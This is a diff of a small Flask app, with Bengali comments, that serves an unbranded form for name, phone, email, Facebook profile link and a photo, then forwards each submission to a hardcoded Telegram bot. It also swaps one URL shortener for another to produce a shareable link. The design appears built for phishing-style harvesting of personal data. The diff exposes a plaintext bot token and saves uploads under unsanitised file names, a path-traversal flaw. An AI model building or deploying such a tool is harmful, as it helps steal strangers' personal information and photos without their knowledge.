@@ -1,23 +1,15 @@
 import os
-from flask import Flask, request, jsonify, redirect, render_template_string
+from flask import Flask, request, render_template_string
 import socket
 import requests
 
 app = Flask(__name__)
 
 # Telegram Bot Configurations
-TELEGRAM_BOT_TOKEN = "7721371260:AAGMALbPA8aAlZP9jrGxar25DM_nqbhsomI"
+TELEGRAM_BOT_TOKEN = "7721371260:AAGMALbPA8aAlZP9jrGxar25DM_nqbhsomI"  # আপনার টেলিগ্রাম বট টোকেন দিন
 TELEGRAM_CHAT_ID = "6904067155"  # আপনার টেলিগ্রাম চ্যাট আইডি দিন
 
-# TinyURL API for Short Link Generation
-def generate_short_link(long_url):
-    response = requests.get(f"https://tinyurl.com/api-create.php?url={long_url}")
-    if response.status_code == 200:
-        return response.text
-    else:
-        return long_url
-
-# HTML Template for the Form
+# HTML Template for Form
 html_template = """
 <!DOCTYPE html>
 <html>
@@ -26,33 +18,32 @@ html_template = """
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
+            background-color: #f9f9f9;
             margin: 0;
             padding: 0;
         }
         .container {
-            max-width: 500px;
+            max-width: 600px;
             margin: 50px auto;
             background: #ffffff;
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
         }
         h2 {
             text-align: center;
-            color: #333333;
+            color: #333;
         }
         label {
             display: block;
             margin: 10px 0 5px;
             font-weight: bold;
-            color: #555555;
         }
         input[type="text"], input[type="email"], input[type="url"], input[type="file"] {
             width: 100%;
             padding: 10px;
             margin-bottom: 15px;
-            border: 1px solid #dddddd;
+            border: 1px solid #ccc;
             border-radius: 5px;
         }
         input:invalid {
@@ -62,11 +53,11 @@ html_template = """
             width: 100%;
             padding: 10px;
             background: #007bff;
-            color: white;
+            color: #fff;
             border: none;
             border-radius: 5px;
-            cursor: pointer;
             font-size: 16px;
+            cursor: pointer;
         }
         button:hover {
             background: #0056b3;
@@ -75,7 +66,7 @@ html_template = """
             text-align: center;
             margin-top: 20px;
             font-size: 14px;
-            color: #888888;
+            color: #666;
         }
     </style>
 </head>
@@ -85,62 +76,24 @@ html_template = """
         <form action="/submit" method="post" enctype="multipart/form-data">
             <label for="name">Name:</label>
             <input type="text" id="name" name="name" required>
-            
+
             <label for="phone">Phone Number:</label>
             <input type="text" id="phone" name="phone" required>
-            
+
             <label for="email">Email Address:</label>
             <input type="email" id="email" name="email" required>
-            
-            <label for="facebook">Facebook ID Link:</label>
+
+            <label for="facebook">Facebook Profile Link:</label>
             <input type="url" id="facebook" name="facebook" required>
-            
+
             <label for="photo">Upload Photo:</label>
             <input type="file" id="photo" name="photo" accept="image/*" required>
-            
+
             <button type="submit">Submit</button>
         </form>
     </div>
     <div class="footer">
-        &copy; 2024 Your Organization. All rights reserved.
-    </div>
-</body>
-</html>
-"""
-
-# Success Page Template
-success_template = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Submission Successful</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
-            text-align: center;
-            padding: 50px;
-        }
-        .message {
-            max-width: 400px;
-            margin: 0 auto;
-            background: #ffffff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-        }
-        h2 {
-            color: #28a745;
-        }
-        p {
-            color: #555555;
-        }
-    </style>
-</head>
-<body>
-    <div class="message">
-        <h2>Thank you for your submission!</h2>
-        <p>We have received your information. You will be contacted soon.</p>
+        &copy; 2024 Your Organization
     </div>
 </body>
 </html>
@@ -148,7 +101,7 @@ success_template = """
 
 @app.route("/")
 def index():
-    return "Welcome! Use /form to view the form."
+    return "Welcome! Go to /form to submit your information."
 
 @app.route("/form")
 def form():
@@ -162,24 +115,18 @@ def submit():
     facebook = request.form["facebook"]
     photo = request.files["photo"]
 
-    # Save the photo locally
-    photo_path = f"static/{photo.filename}"
+    # Save photo locally
+    photo_path = os.path.join("static", photo.filename)
     photo.save(photo_path)
 
     # Send data to Telegram
-    message = f"""
-        New Submission:
-        Name: {name}
-        Phone: {phone}
-        Email: {email}
-        Facebook: {facebook}
-    """
+    message = f"New Submission:\nName: {name}\nPhone: {phone}\nEmail: {email}\nFacebook: {facebook}"
     requests.post(
         f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
         data={"chat_id": TELEGRAM_CHAT_ID, "text": message}
     )
 
-    # Send the photo to Telegram
+    # Send photo to Telegram
     with open(photo_path, "rb") as file:
         requests.post(
             f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
@@ -187,7 +134,7 @@ def submit():
             files={"photo": file}
         )
 
-    return render_template_string(success_template)
+    return "Submission successful! Thank you for your response."
 
 def find_free_port():
     """Finds a free port to use."""
@@ -195,8 +142,16 @@ def find_free_port():
         s.bind(("", 0))
         return s.getsockname()[1]
 
+def shorten_url(url):
+    """Shortens a given URL using is.gd API."""
+    api_url = f"https://is.gd/create.php?format=simple&url={url}"
+    response = requests.get(api_url)
+    return response.text
+
 if __name__ == "__main__":
     port = find_free_port()
-    short_link = generate_short_link(f"http://127.0.0.1:{port}/form")
-    print(f"Form is available at: {short_link}")
-    app.run(host="0.0.0.0", port=port, debug=True)
+    local_url = f"http://127.0.0.1:{port}/form"
+    short_url = shorten_url(local_url)
+    print(f"Server is running on: {local_url}")
+    print(f"Shortened URL: {short_url}")
+    app.run(host="127.0.0.1", port=port, debug=True)
